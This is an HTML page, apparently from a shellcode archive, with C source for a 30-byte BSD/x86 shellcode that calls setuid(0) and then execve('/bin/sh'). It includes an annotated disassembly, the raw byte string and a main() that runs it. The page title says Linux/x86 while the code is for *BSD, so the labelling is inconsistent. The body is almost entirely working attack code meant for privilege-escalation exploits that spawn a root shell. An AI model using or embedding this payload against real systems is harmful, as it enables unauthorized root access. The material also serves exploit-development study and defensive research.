<html><head><title>Linux/x86 - setuid/execve - 30 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * $Id: setuid-bsd.c,v 1.6 2004/06/02 12:22:30 raptor Exp $
 *
 * setuid-bsd.c - setuid/execve shellcode for *BSD/x86
 * Copyright (c) 2003 Marco Ivaldi &lt; raptor@0xdeadbeef.info &gt;
 *
 * Short setuid(0) and /bin/sh execve() shellcode (based on esdee's code).
 *
 * Tested on OpenBSD and FreeBSD.
 */

/*
 * setuid(0)
 *
 * 20c8:       31 c0                   xor    %eax,%eax
 * 20ca:       50                      push   %eax
 * 20cb:       50                      push   %eax
 * 20cc:       b0 17                   mov    $0x17,%al
 * 20ce:       cd 80                   int    $0x80
 *
 * execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)
 *
 * 20d0:       31 c0                   xor    %eax,%eax
 * 20d2:       50                      push   %eax
 * 20d3:       68 2f 2f 73 68          push   $0x68732f2f
 * 20d8:       68 2f 62 69 6e          push   $0x6e69622f
 * 20dd:       89 e3                   mov    %esp,%ebx
 * 20df:       50                      push   %eax
 * 20e0:       54                      push   %esp
 * 20e1:       53                      push   %ebx
 * 20e2:       50                      push   %eax
 * 20e3:       b0 3b                   mov    $0x3b,%al
 * 20e5:       cd 80                   int    $0x80
 */

char sc[] = /* 7 + 23 = 30 bytes */
&quot;\x31\xc0\x50\x50\xb0\x17\xcd\x80&quot;
&quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80&quot;;

main()
{
	int (*f)() = (int (*)())sc; f();
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
